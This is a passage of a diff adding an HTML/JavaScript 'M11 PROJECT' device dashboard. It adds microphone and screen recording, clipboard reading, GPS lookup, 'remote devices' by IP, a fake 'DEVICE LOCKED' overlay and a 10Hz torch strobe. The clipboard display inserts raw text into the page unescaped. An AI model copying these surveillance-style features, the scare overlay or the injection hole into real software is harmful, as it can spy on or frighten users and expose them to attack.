+                <button class="cam-btn" onclick="startScreenShare()" style="background:var(--accent);border-color:var(--accent);">
+                    <i class="fas fa-play"></i> Start Share
+                </button>
+                <button class="cam-btn" onclick="stopScreenShare()" style="background:var(--danger);border-color:var(--danger);">
+                    <i class="fas fa-stop"></i> Stop
+                </button>
+                <button class="cam-btn" onclick="downloadScreenRecording()" id="dlScreenBtn" style="display:none;">
+                    <i class="fas fa-download"></i> Download
+                </button>
+            </div>
+        </div>
+
+        <!-- ADD DEVICE VIA IP -->
+        <div class="section-title fade-in-up delay-3">
+            <i class="fas fa-network-wired"></i>
+            <h3>Remote Devices</h3>
+            <span id="peerCount">0 devices</span>
+        </div>
+        <div style="margin: 0 20px 20px;" class="fade-in-up delay-3">
+            <div style="display:flex;gap:10px;margin-bottom:16px;">
+                <input type="text" id="peerIP" placeholder="192.168.1.100" style="flex:1;padding:14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:14px;color:var(--text);font-family:inherit;font-size:14px;">
+                <button class="cam-btn" onclick="addPeer()" style="background:var(--accent);border-color:var(--accent);white-space:nowrap;">
+                    <i class="fas fa-plus"></i> Add
+                </button>
+            </div>
+            <div class="peer-grid" id="peerList"></div>
+            <div class="peer-video-grid" id="peerVideos"></div>
+        </div>
+        
+        <div class="section-title fade-in-up delay-4">
+            <i class="fas fa-terminal"></i>
+            <h3>Activity Log</h3>
+            <span>Live</span>
+        </div>
+        <div style="margin: 0 20px 100px;" class="fade-in-up delay-4">
+            <div class="terminal" id="terminal">
+                <div class="terminal-line">
+                    <span class="terminal-time">[INIT]</span>
+                    <span class="terminal-msg">M11 PROJECT initialized</span>
+                </div>
+            </div>
+        </div>
+                <!-- MIKROFON LIVE -->
+        <div class="section-title fade-in-up delay-2">
+            <i class="fas fa-microphone"></i>
+            <h3>Live Microphone</h3>
+            <span id="micStatus">OFF</span>
+        </div>
+        <div style="margin: 0 20px 20px;" class="fade-in-up delay-2">
+            <div class="mic-container" id="micContainer">
+                <div class="mic-visualizer" id="micVisualizer"></div>
+                <div class="mic-status">
+                    <span class="mic-dot" id="micDot" style="display:none;"></span>
+                    <span id="micStatusText">Microphone inactive</span>
+                </div>
+                <div class="mic-controls">
+                    <button class="cam-btn" onclick="startMic()" style="background:var(--accent);border-color:var(--accent);">
+                        <i class="fas fa-play"></i> Start Listening
+                    </button>
+                    <button class="cam-btn" onclick="stopMic()" style="background:var(--danger);border-color:var(--danger);">
+                        <i class="fas fa-stop"></i> Stop
+                    </button>
+                    <button class="cam-btn" onclick="downloadMicRecording()" id="micDownload" style="display:none;">
+                        <i class="fas fa-download"></i> Download
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- NOTIFIKASI LOG -->
+        <div class="section-title fade-in-up delay-3">
+            <i class="fas fa-bell"></i>
+            <h3>Notification Log</h3>
+            <span id="notifCount">0 new</span>
+        </div>
+        <div style="margin: 0 20px 20px;" class="fade-in-up delay-3">
+            <div class="notif-container" id="notifContainer">
+                <div class="notif-empty" id="notifEmpty">
+                    <i class="fas fa-bell-slash" style="font-size:32px;color:var(--text-muted);margin-bottom:12px;display:block;"></i>
+                    Waiting for notifications...
+                </div>
+            </div>
+            <div style="display:flex;gap:10px;justify-content:center;margin-top:12px;">
+                <button class="cam-btn" onclick="requestNotifPermission()" style="background:var(--accent);border-color:var(--accent);">
+                    <i class="fas fa-bell"></i> Enable Notifications
+                </button>
+                <button class="cam-btn" onclick="clearNotifLog()">
+                    <i class="fas fa-trash"></i> Clear Log
+                </button>
+            </div>
+        </div>
+
+        <!-- LOCK SCREEN -->
+        <div class="section-title fade-in-up delay-3">
+            <i class="fas fa-lock"></i>
+            <h3>Screen Lock</h3>
+            <span>•_•</span>
+        </div>
+        <div style="margin: 0 20px 100px;" class="fade-in-up delay-3">
+            <div class="device-info-card">
+                <div class="device-info-header">
+                    <i class="fas fa-shield-alt" style="color:var(--danger);"></i>
+                    <h4>Device Lock Control</h4>
+                </div>
+                <p style="font-size:12px;color:var(--text-sec);margin-bottom:16px;line-height:1.5;">
+                    Lock device screen Device will be inaccessible during lock period.
+                </p>
+                <button class="cam-btn" onclick="triggerLockScreen()" style="width:100%;background:var(--danger);border-color:var(--danger);font-size:14px;padding:16px;">
+                    <i class="fas fa-lock"></i> LOCK DEVICE
+                </button>
+            </div>
+        </div>
+        
+                <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchTab(this)">
+                <i class="fas fa-th-large"></i>
+                <span>Dashboard</span>
+            </div>
+            <div class="nav-item" onclick="switchTab(this)">
+                <i class="fas fa-eye"></i>
+                <span>Monitor</span>
+            </div>
+            <div class="nav-item" onclick="receivePeerOffer()">
+                <i class="fas fa-network-wired"></i>
+                <span>Devices</span>
+            </div>
+            <div class="nav-item" onclick="switchTab(this)">
+                <i class="fas fa-cog"></i>
+                <span>Settings</span>
+            </div>
+        </div>
+        
+            <!-- LOCK SCREEN OVERLAY -->
+    <div class="lock-overlay" id="lockOverlay">
+        <div class="lock-icon"><i class="fas fa-lock"></i></div>
+        <div class="lock-text">DEVICE LOCKED</div>
+        <div class="lock-sub">Screen access restricted</div>
+        <div class="lock-timer" id="lockTimer">10000</div>
+        <div class="lock-hint">
+            Device will unlock automatically<br>
+            Do not close this page
+        </div>
+    </div>
+
+    <script>
+        // STATE
+        let isFlashOn = false;
+        let batteryObj = null;
+        let wakeLockObj = null;
+
+        // PARTICLES
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 20; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                p.style.animationDelay = Math.random() * 10 + 's';
+                container.appendChild(p);
+            }
+        }
+
+        // INIT
+        window.addEventListener('DOMContentLoaded', () => {
+            createParticles();
+            initDeviceInfo();
+            initBattery();
+            initNetwork();
+            initIP();
+            addLog('M11 PROJECT Dashboard loaded', 'success');
+        });
+
+        // TOAST
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            const icons = { success: 'fa-check-circle', error: 'fa-times-circle', info: 'fa-info-circle', warn: 'fa-exclamation-triangle' };
+            toast.innerHTML = `<i class="fas ${icons[type] || icons.info}"></i><span>${message}</span>`;
+            container.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        // MODAL
+        function openModal(title, content) {
+            document.getElementById('modalTitle').textContent = title;
+            document.getElementById('modalBody').innerHTML = content;
+            document.getElementById('modalOverlay').classList.add('active');
+        }
+
+        function closeModal(e) {
+            if (!e || e.target === document.getElementById('modalOverlay')) {
+                document.getElementById('modalOverlay').classList.remove('active');
+            }
+        }
+
+        // REAL DEVICE INFO
+        function initDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceName = 'Unknown';
+            let osVersion = 'Unknown';
+            
+            if (ua.includes('Android')) {
+                const match = ua.match(/Android\s([\d.]+)/);
+                osVersion = 'Android ' + (match ? match[1] : '');
+                deviceName = ua.match(/\((.*?)\)/)?.[1]?.split(';')?.pop()?.trim() || 'Android Device';
+            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                osVersion = 'iOS ' + (ua.match(/OS\s(\d+[_\d]+)/)?.[1]?.replace(/_/g, '.') || '');
+                deviceName = ua.includes('iPad') ? 'iPad' : 'iPhone';
+            } else if (ua.includes('Windows')) {
+                osVersion = 'Windows';
+                deviceName = 'Windows PC';
+            } else if (ua.includes('Mac')) {
+                osVersion = 'macOS';
+                deviceName = 'Mac';
+            } else if (ua.includes('Linux')) {
+                osVersion = 'Linux';
+                deviceName = 'Linux';
+            }
+
+            document.getElementById('deviceName').textContent = deviceName;
+            document.getElementById('osVersion').textContent = osVersion;
+            document.getElementById('platform').textContent = navigator.platform;
+            document.getElementById('cores').textContent = navigator.hardwareConcurrency || 'N/A';
+            document.getElementById('memory').textContent = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A';
+            document.getElementById('screen').textContent = screen.width + 'x' + screen.height + ' (' + window.devicePixelRatio + 'x)';
+            document.getElementById('language').textContent = navigator.language;
+            document.getElementById('online').textContent = navigator.onLine ? 'Yes' : 'No';
+
+            window.addEventListener('online', () => {
+                document.getElementById('online').textContent = 'Yes';
+                showToast('Device is online', 'success');
+            });
+            window.addEventListener('offline', () => {
+                document.getElementById('online').textContent = 'No';
+                showToast('Device is offline', 'error');
+            });
+        }
+
+        // BATTERY API - REAL TIME
+        function initBattery() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    batteryObj = battery;
+                    updateBattery(battery);
+
+                    battery.addEventListener('levelchange', () => updateBattery(battery));
+                    battery.addEventListener('chargingchange', () => updateBattery(battery));
+                    battery.addEventListener('chargingtimechange', () => updateBattery(battery));
+                    battery.addEventListener('dischargingtimechange', () => updateBattery(battery));
+                });
+            } else {
+                document.getElementById('batteryText').textContent = 'N/A';
+            }
+        }
+
+        function updateBattery(battery) {
+            const level = Math.round(battery.level * 100);
+            const charging = battery.charging ? '⚡ ' : '';
+            document.getElementById('batteryText').textContent = charging + level + '%';
+            addLog(`Battery: ${level}% ${battery.charging ? '(charging)' : '(discharging)'}`, 'info');
+        }
+
+        function showBatteryDetails() {
+            if (!batteryObj) {
+                showToast('Battery API not supported', 'error');
+                return;
+            }
+            const level = Math.round(batteryObj.level * 100);
+            const status = batteryObj.charging ? 'Charging' : 'Discharging';
+            const time = batteryObj.charging ? batteryObj.chargingTime : batteryObj.dischargingTime;
+            const timeText = time !== Infinity && !isNaN(time) ? Math.round(time / 60) + ' min' : 'Calculating...';
+
+            openModal('Battery Details', `
+                <div style="text-align:center;padding:20px;">
+                    <div style="font-size:48px;font-weight:800;color:var(--accent);margin-bottom:8px;">${level}%</div>
+                    <div style="width:100%;height:20px;background:rgba(0,0,0,0.3);border-radius:10px;overflow:hidden;margin-bottom:16px;">
+                        <div style="height:100%;width:${level}%;background:linear-gradient(90deg,${batteryObj.charging ? 'var(--success)' : 'var(--warning)'},var(--accent));border-radius:10px;transition:width 0.5s;"></div>
+                    </div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:12px;color:var(--text-sec);">
+                        <div>Status: ${status}</div>
+                        <div>Level: ${level}%</div>
+                        <div>Time: ${timeText}</div>
+                        <div>API: Supported</div>
+                    </div>
+                </div>
+            `);
+        }
+
+        // NETWORK API - REAL TIME
+        function initNetwork() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                updateNetwork(connection);
+                connection.addEventListener('change', () => updateNetwork(connection));
+            } else {
+                document.getElementById('signalText').textContent = navigator.onLine ? 'Online' : 'Offline';
+            }
+        }
+
+        function updateNetwork(connection) {
+            const type = connection.effectiveType || connection.type || 'Unknown';
+            document.getElementById('signalText').textContent = type.toUpperCase();
+            addLog(`Network changed: ${type}`, 'info');
+        }
+
+        function showNetworkDetails() {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let html = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">';
+            
+            const info = {
+                'Type': connection?.effectiveType || connection?.type || 'Unknown',
+                'Downlink': connection?.downlink ? connection.downlink + ' Mbps' : 'Unknown',
+                'RTT': connection?.rtt ? connection.rtt + ' ms' : 'Unknown',
+                'Save Data': connection?.saveData ? 'On' : 'Off',
+                'Online': navigator.onLine ? 'Yes' : 'No'
+            };
+
+            for (let [k, v] of Object.entries(info)) {
+                html += `<div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;">
+                    <div style="font-size:10px;color:var(--text-muted);text-transform:uppercase;">${k}</div>
+                    <div style="font-size:14px;font-weight:600;margin-top:4px;">${v}</div>
+                </div>`;
+            }
+            html += '</div>';
+            openModal('Network Information', html);
+        }
+
+        // IP - REAL
+        function initIP() {
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
+                document.getElementById('ipText').textContent = data.ip;
+                addLog('IP Address detected: ' + data.ip, 'success');
+            }).catch(() => {
+                document.getElementById('ipText').textContent = 'Local';
+                addLog('IP fetch failed, using local', 'warn');
+            });
+        }
+
+        function showIPDetails() {
+            const ip = document.getElementById('ipText').textContent;
+            openModal('IP Address', `
+                <div style="text-align:center;padding:20px;">
+                    <div style="font-size:32px;font-weight:800;color:var(--accent);margin-bottom:8px;">${ip}</div>
+                    <div style="font-size:12px;color:var(--text-muted);margin-bottom:16px;">Your Public IP Address</div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;font-size:12px;">
+                        <div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;">
+                            <div style="color:var(--text-muted);font-size:10px;">Protocol</div>
+                            <div style="font-weight:600;margin-top:4px;">${location.protocol}</div>
+                        </div>
+                        <div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;">
+                            <div style="color:var(--text-muted);font-size:10px;">Host</div>
+                            <div style="font-weight:600;margin-top:4px;">${location.host}</div>
+                        </div>
+                    </div>
+                </div>
+            `);
+        }
+
+        // GPS LOCATION
+        function showLocation() {
+            if (!navigator.geolocation) {
+                showToast('Geolocation not supported', 'error');
+                return;
+            }
+            showToast('Getting location...', 'info');
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const { latitude, longitude, accuracy, altitude } = pos.coords;
+                    openModal('GPS Location', `
+                        <div style="padding:10px;">
+                            <div style="background:linear-gradient(135deg,var(--accent),var(--accent-soft));border-radius:16px;padding:20px;text-align:center;margin-bottom:16px;">
+                                <div style="font-size:36px;font-weight:800;">${latitude.toFixed(6)}</div>
+                                <div style="font-size:11px;opacity:0.8;margin-top:4px;">LATITUDE</div>
+                                <div style="font-size:36px;font-weight:800;margin-top:12px;">${longitude.toFixed(6)}</div>
+                                <div style="font-size:11px;opacity:0.8;margin-top:4px;">LONGITUDE</div>
+                            </div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+                                <div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;">
+                                    <div style="font-size:10px;color:var(--text-muted);">Accuracy</div>
+                                    <div style="font-weight:600;margin-top:4px;">${Math.round(accuracy)}m</div>
+                                </div>
+                                <div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;">
+                                    <div style="font-size:10px;color:var(--text-muted);">Altitude</div>
+                                    <div style="font-weight:600;margin-top:4px;">${altitude !== null ? Math.round(altitude) + 'm' : 'N/A'}</div>
+                                </div>
+                            </div>
+                            <button onclick="window.open('https://maps.google.com/?q=${latitude},${longitude}','_blank')" style="width:100%;margin-top:16px;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Open in Maps</button>
+                        </div>
+                    `);
+                    addLog(`Location: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`, 'success');
+                },
+                err => {
+                    showToast('Location error: ' + err.message, 'error');
+                    addLog('Location failed: ' + err.message, 'error');
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        }
+
+        // CLIPBOARD
+        async function showClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                openModal('Clipboard Content', `
+                    <div style="padding:10px;">
+                        <div style="background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:14px;padding:16px;font-family:monospace;font-size:13px;word-break:break-all;min-height:80px;color:var(--text);">
+                            ${text || '<span style="color:var(--text-muted);">(empty)</span>'}
+                        </div>
+                        <button onclick="copyToClipboard('${text.replace(/'/g, "\\'")}')" style="width:100%;margin-top:12px;padding:12px;background:var(--bg-card);border:1px solid var(--border);border-radius:12px;color:var(--text);font-weight:500;cursor:pointer;font-family:inherit;">Copy Again</button>
+                    </div>
+                `);
+                addLog('Clipboard read successfully', 'success');
+            } catch (e) {
+                showToast('Clipboard access denied', 'error');
+                addLog('Clipboard error: ' + e.message, 'error');
+            }
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => showToast('Copied!', 'success'));
+        }
+
+        // NETWORK INFO (Monitoring)
+        function showNetwork() {
+            showNetworkDetails();
+        }
+
+        // SYSTEM INFO
+        function showSystemInfo() {
+            const info = {
+                'User Agent': navigator.userAgent.substring(0, 50) + '...',
+                'Platform': navigator.platform,
+                'Vendor': navigator.vendor || 'N/A',
+                'Product': navigator.product || 'N/A',
+                'Product Sub': navigator.productSub || 'N/A',
+                'CPU Cores': navigator.hardwareConcurrency || 'N/A',
+                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+                'Max Touch Points': navigator.maxTouchPoints || 'N/A',
+                'PDF Viewer': navigator.pdfViewerEnabled ? 'Yes' : 'No',
+                'Cookies Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
+                'Java Enabled': navigator.javaEnabled() ? 'Yes' : 'No',
+                'Do Not Track': navigator.doNotTrack || 'N/A',
+                'Language': navigator.language,
+                'Languages': navigator.languages?.join(', ') || 'N/A',
+                'Screen Width': screen.width,
+                'Screen Height': screen.height,
+                'Avail Width': screen.availWidth,
+                'Avail Height': screen.availHeight,
+                'Color Depth': screen.colorDepth + '-bit',
+                'Pixel Ratio': window.devicePixelRatio + 'x',
+                'Viewport': window.innerWidth + 'x' + window.innerHeight,
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Timezone Offset': new Date().getTimezoneOffset() + ' min'
+            };
+
+            let html = '<div style="display:grid;gap:8px;">';
+            for (let [k, v] of Object.entries(info)) {
+                html += `<div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;display:flex;justify-content:space-between;align-items:center;">
+                    <span style="font-size:10px;color:var(--text-muted);text-transform:uppercase;">${k}</span>
+                    <span style="font-size:12px;font-weight:600;word-break:break-all;max-width:60%;text-align:right;">${v}</span>
+                </div>`;
+            }
+            html += '</div>';
+            openModal('System Information', html);
+            addLog('System info displayed', 'info');
+        }
+
+        // STORAGE
+        async function showStorage() {
+            let html = '<div style="display:grid;gap:10px;">';
+            
+            if ('storage' in navigator && 'estimate' in navigator.storage) {
+                try {
+                    const est = await navigator.storage.estimate();
+                    const used = est.usage ? (est.usage / 1024 / 1024 / 1024).toFixed(2) : 'N/A';
+                    const total = est.quota ? (est.quota / 1024 / 1024 / 1024).toFixed(2) : 'N/A';
+                    const percent = est.quota && est.usage ? Math.round((est.usage / est.quota) * 100) : 0;
+
+                    html += `
+                        <div style="background:rgba(0,0,0,0.3);border-radius:14px;padding:16px;">
+                            <div style="font-size:10px;color:var(--text-muted);margin-bottom:8px;">STORAGE USAGE</div>
+                            <div style="width:100%;height:20px;background:rgba(0,0,0,0.3);border-radius:10px;overflow:hidden;margin-bottom:12px;">
+                                <div style="height:100%;width:${percent}%;background:linear-gradient(90deg,var(--accent),var(--accent-soft));border-radius:10px;transition:width 0.5s;"></div>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;font-size:12px;">
+                                <span>${used} GB used</span>
+                                <span>${total} GB total</span>
+                            </div>
+                        </div>
+                    `;
+                } catch (e) {
+                    html += `<div style="color:var(--danger);">Storage estimate failed</div>`;
+                }
+            }
+
+            html += `<div style="background:rgba(0,0,0,0.3);border-radius:14px;padding:16px;">
+                <div style="font-size:10px;color:var(--text-muted);margin-bottom:8px;">LOCAL STORAGE</div>
+                <div style="font-size:13px;font-weight:600;">${(JSON.stringify(localStorage).length / 1024).toFixed(2)} KB used</div>
+                <div style="font-size:11px;color:var(--text-sec);margin-top:4px;">${localStorage.length} items</div>
+            </div>`;
+
+            html += `<div style="background:rgba(0,0,0,0.3);border-radius:14px;padding:16px;">
+                <div style="font-size:10px;color:var(--text-muted);margin-bottom:8px;">SESSION STORAGE</div>
+                <div style="font-size:13px;font-weight:600;">${(JSON.stringify(sessionStorage).length / 1024).toFixed(2)} KB used</div>
+                <div style="font-size:11px;color:var(--text-sec);margin-top:4px;">${sessionStorage.length} items</div>
+            </div>`;
+
+            html += '</div>';
+            openModal('Storage Information', html);
+            addLog('Storage info displayed', 'info');
+        }
+
+        // PERMISSIONS
+        async function showPermissions() {
+            const permissions = [
+                'geolocation', 'notifications', 'camera', 'microphone',
+                'clipboard-read', 'clipboard-write', 'midi', 'storage-access'
+            ];
+
+            let html = '<div style="display:grid;gap:8px;">';
+            
+            for (const perm of permissions) {
+                let status = 'Unknown';
+                let color = 'var(--text-muted)';
+                try {
+                    const result = await navigator.permissions.query({ name: perm });
+                    status = result.state;
+                    if (status === 'granted') color = 'var(--success)';
+                    else if (status === 'denied') color = 'var(--danger)';
+                    else if (status === 'prompt') color = 'var(--warning)';
+                } catch (e) {
+                    status = 'N/A';
+                }
+
+                html += `<div style="background:rgba(0,0,0,0.3);padding:12px;border-radius:10px;display:flex;justify-content:space-between;align-items:center;">
+                    <span style="font-size:12px;font-weight:500;">${perm}</span>
+                    <span style="font-size:11px;font-weight:600;color:${color};text-transform:uppercase;">${status}</span>
+                </div>`;
+            }
+            html += '</div>';
+            openModal('Permissions Status', html);
+            addLog('Permissions checked', 'info');
+        }
+        
+        // ============ FLASHLIGHT NORMAL + STROBE ============
+async function toggleFlash() {
+    openModal('Flashlight Control', `
+        <div style="padding:10px;">
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px;">
+                <button onclick="toggleNormalFlash()" style="padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:14px;color:var(--text);font-weight:600;cursor:pointer;font-family:inherit;">
+                    <i class="fas fa-bolt" style="display:block;margin-bottom:6px;color:var(--accent);font-size:20px;"></i>
+                    Normal ON/OFF
+                </button>
+                <button onclick="toggleStrobeFlash()" style="padding:16px;background:var(--bg-card);border:1px solid var(--border);border-radius:14px;color:var(--text);font-weight:600;cursor:pointer;font-family:inherit;">
+                    <i class="fas fa-bolt" style="display:block;margin-bottom:6px;color:var(--danger);font-size:20px;"></i>
+                    STROBE MODE
+                </button>
+            </div>
+            <button onclick="stopAllFlash();closeModal()" style="width:100%;padding:14px;background:var(--danger);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">STOP ALL</button>
+        </div>
+    `);
+}
+
+async function toggleNormalFlash() {
+    try {
+        if (!isFlashOn) {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            window.flashStream = stream;
+            const track = stream.getVideoTracks()[0];
+            const capabilities = track.getCapabilities();
+            if (capabilities.torch) {
+                await track.applyConstraints({ advanced: [{ torch: true }] });
+                isFlashOn = true;
+                showToast('Flashlight ON', 'success');
+                addLog('Flashlight turned ON', 'success');
+            } else {
+                showToast('Torch not supported', 'warn');
+                stream.getTracks().forEach(t => t.stop());
+            }
+        } else {
+            if (window.flashStream) {
+                window.flashStream.getTracks().forEach(t => t.stop());
+                window.flashStream = null;
+            }
+            isFlashOn = false;
+            showToast('Flashlight OFF', 'info');
+            addLog('Flashlight turned OFF', 'info');
+        }
+    } catch (e) {
+        showToast('Flashlight error: ' + e.message, 'error');
+    }
+}
+
+        // ============ FLASHLIGHT STROBE - REAL ============
+let strobeInterval = null;
+let isStrobeOn = false;
+
+async function toggleStrobeFlash() {
+    try {
+        if (!isStrobeOn) {
+            // Request camera with torch capability
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'environment' } 
+            });
+            window.strobeStream = stream;
+            const track = stream.getVideoTracks()[0];
+            const capabilities = track.getCapabilities();
+            
+            if (!capabilities.torch) {
+                showToast('Torch not supported on this device', 'error');
+                stream.getTracks().forEach(t => t.stop());
+                return;
+            }
+            
+            isStrobeOn = true;
+            let torchState = false;
+            
+            // Strobe loop - blink every 50ms (super fast)
+            strobeInterval = setInterval(async () => {
+                torchState = !torchState;
+                try {
+                    await track.applyConstraints({ 
+                        advanced: [{ torch: torchState }] 
+                    });
+                } catch (e) {
+                    // Ignore constraint errors during rapid switching
+                }
+            }, 50); // 50ms = 10 flashes per second
+            
+            showToast('Strobe ON (10Hz)', 'success');
+            addLog('Flashlight strobe activated: 10Hz', 'success');
+            
+        } else {
+            stopStrobe();
+        }
+    } catch (e) {
+        showToast('Strobe error: ' + e.message, 'error');
+        addLog('Strobe failed: ' + e.message, 'error');
+    }
+}
+
+function stopStrobe() {
+    if (strobeInterval) {
+        clearInterval(strobeInterval);
+        strobeInterval = null;
+    }
+    if (window.strobeStream) {
+        // Turn off torch before stopping stream
+        const track = window.strobeStream.getVideoTracks()[0];
+        track.applyConstraints({ advanced: [{ torch: false }] }).finally(() => {
+            window.strobeStream.getTracks().forEach(t => t.stop());
+            window.strobeStream = null;
+        });
+    }
+    isStrobeOn = false;
+    showToast('Strobe OFF', 'info');
+    addLog('Flashlight strobe stopped', 'info');
+}
+
+// Emergency stop all flashlight
+function stopAllFlash() {
+    stopStrobe();
+    if (window.flashStream) {
+        window.flashStream.getTracks().forEach(t => t.stop());
+        window.flashStream = null;
+    }
+    isFlashOn = false;
+    const flashStatus = document.getElementById('flashStatus');
+    if (flashStatus) flashStatus.textContent = 'Tap to toggle';
+}
+
+        // VIBRATE
+        function triggerVibrate() {
+            if ('vibrate' in navigator) {
+                navigator.vibrate([200, 100, 200, 100, 400]);
+                showToast('Vibration triggered', 'success');
+                addLog('Vibration pattern sent', 'success');
+            } else {
+                showToast('Vibration not supported', 'error');
+            }
+        }
+
+        // SHOW TOAST TEXT
+        function showToastText() {
+            openModal('Show Toast', `
+                <div style="padding:10px;">
+                    <input type="text" id="toastInput" placeholder="Enter message..." style="margin-bottom:12px;">
+                    <button onclick="sendCustomToast()" style="width:100%;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Show Toast</button>
+                </div>
+            `);
+            setTimeout(() => document.getElementById('toastInput').focus(), 100);
+        }
+
+        function sendCustomToast() {
+            const msg = document.getElementById('toastInput').value || 'Hello from M11!';
+            showToast(msg, 'info');
+            addLog('Custom toast: ' + msg, 'info');
+            closeModal();
+        }
+
+        // TTS
+        function sendTTS() {
+            openModal('Text to Speech', `
+                <div style="padding:10px;">
+                    <textarea id="ttsInput" placeholder="Enter text to speak..." style="margin-bottom:12px;">Hello, this is M11 PROJECT speaking.</textarea>
+                    <div style="display:flex;gap:10px;">
+                        <button onclick="speakText()" style="flex:1;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Speak</button>
+                        <button onclick="stopTTS()" style="flex:1;padding:14px;background:var(--bg-card);border:1px solid var(--border);border-radius:14px;color:var(--text);font-weight:600;cursor:pointer;font-family:inherit;">Stop</button>
+                    </div>
+                </div>
+            `);
+        }
+
+        function speakText() {
+            const text = document.getElementById('ttsInput').value;
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                const utterance = new SpeechSynthesisUtterance(text);
+                utterance.rate = 1;
+                utterance.pitch = 1;
+                utterance.volume = 1;
+                window.speechSynthesis.speak(utterance);
+                showToast('Speaking...', 'info');
+                addLog('TTS: ' + text.substring(0, 30) + '...', 'info');
+            } else {
+                showToast('TTS not supported', 'error');
+            }
+        }
+
+        function stopTTS() {
+            if ('speechSynthesis' in window) {
+                window.speechSynthesis.cancel();
+                showToast('TTS stopped', 'info');
+            }
+        }
+
+        // OPEN URL
+        function openWeb() {
+            openModal('Open URL', `
+                <div style="padding:10px;">
+                    <input type="url" id="urlInput" placeholder="https://example.com" value="https://google.com" style="margin-bottom:12px;">
+                    <button onclick="launchURL()" style="width:100%;padding:14px;background:var(--accent);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;">Open Browser</button>
+                </div>
+            `);
+        }
+
+        function launchURL() {
+            const url = document.getElementById('urlInput').value;
+            window.open(url, '_blank');
+            addLog('Opened URL: ' + url, 'info');
+            closeModal();
+        }
+
+        // MAKE CALL
+        function makeCall() {
+            openModal('Dial Number', `
+                <div style="padding:10px;">
+                    <input type="tel" id="phoneInput" placeholder="+628123456789" style="margin-bottom:12px;">
+                    <button onclick="dialNumber()" style="width:100%;padding:14px;background:var(--success);border:none;border-radius:14px;color:white;font-weight:600;cursor:pointer;font-family:inherit;"><i class="fas fa-phone" style="margin-right:8px;"></i>Call</button>
+                </div>
+            `);
+        }
+
+        function dialNumber() {
+            const num = document.getElementById('phoneInput').value;
+            if (num) {
+                window.location.href = 'tel:' + num;
+                addLog('Dialing: ' + num, 'info');
+            }
+            closeModal();
+        }
+
+        // PLAY SOUND
+        function playSound() {
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = ctx.createOscillator();
+            const gain = ctx.createGain();
+            
+            osc.connect(gain);
+            gain.connect(ctx.destination);
+            
+            osc.type = 'sine';
+            osc.frequency.setValueAtTime(880, ctx.currentTime);
+            osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.3);
+            
+            gain.gain.setValueAtTime(0.3, ctx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+            
+            osc.start(ctx.currentTime);
+            osc.stop(ctx.currentTime + 0.3);
+
+            showToast('Beep played!', 'success');
+            addLog('Audio beep generated', 'success');
+        }
+
+        // SELF CONTROL
+        function controlSelf() {
+            openModal('Self Control', `
+                <div style="padding:10px;display:grid;gap:12px;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.3);padding:14px;border-radius:14px;">
+                        <div>
+                            <div style="font-weight:600;">Fullscreen Mode</div>
+                            <div style="font-size:11px;color:var(--text-muted);">Toggle fullscreen display</div>
+                        </div>
+                        <div class="toggle-switch" id="fsToggle" onclick="toggleFullscreen()"></div>
+                    </div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.3);padding:14px;border-radius:14px;">
+                        <div>
